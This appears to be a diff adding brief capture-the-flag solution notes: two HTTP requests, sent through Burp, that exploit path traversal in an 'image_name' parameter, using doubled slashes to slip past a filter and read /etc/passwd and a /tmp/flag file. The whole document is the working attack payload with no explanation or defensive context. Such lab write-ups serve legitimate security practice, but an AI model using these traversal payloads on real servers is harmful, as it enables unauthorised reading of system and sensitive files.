@@ -1,0 +1,4 @@
+in burp 
+1)GET /local?image_name=..//..//..//etc/passwd HTTP/1.1
+
+2)GET /local?image_name=..////tmp/flag HTTP/1.1
